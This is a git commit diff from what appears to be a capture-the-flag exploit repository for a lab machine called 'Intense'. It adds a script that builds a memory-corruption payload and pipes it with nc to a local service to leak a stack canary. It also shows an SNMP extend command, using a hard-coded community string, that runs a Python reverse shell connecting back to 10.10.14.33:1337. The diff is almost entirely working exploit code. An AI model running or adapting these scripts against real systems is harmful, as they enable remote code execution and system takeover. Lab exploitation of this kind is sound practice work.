0e081cda82f658b666903af122b8f98f04a3b2b9
blee <tastypie@gmail.com>
2020-07-25 22:45:49 -0400

    progress

---
+++ intense/c_files/canary_leaker.sh
@@ -0,0 +1,27 @@
+#!/bin/bash
+a="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+b="bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+
+
+# write
+w="\x01\xff"
+
+# copy, offset 1020, 255 bytes
+# server is reading little endian
+#1: case
+#2: offset
+#3: offset
+#4: cpy size
+c="\x02\x00\x04\xff"
+
+# read
+r="\x03"
+
+
+# last 4 bytes to get us to 1024
+fill="\x01\x04\xde\xad\xbe\xef"
+b1024=$w$a$w$b$w$b$w$b$fill
+payload=$b1024$c$r
+
+echo -e $payload | nc localhost 5001
+
--- intense/one_shot_rce.sh
+++ intense/one_shot_rce.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
+sudo nmap -sU -p161 intense.htb
 
 snmpset -m +NET-SNMP-EXTEND-MIB -v 1 -c SuP3RPrivCom90 intense.htb 'nsExtendStatus."command"' = createAndGo 'nsExtendCommand."command"' =   /usr/bin/python3 'nsExtendArgs."command"' = "-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.33\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
 
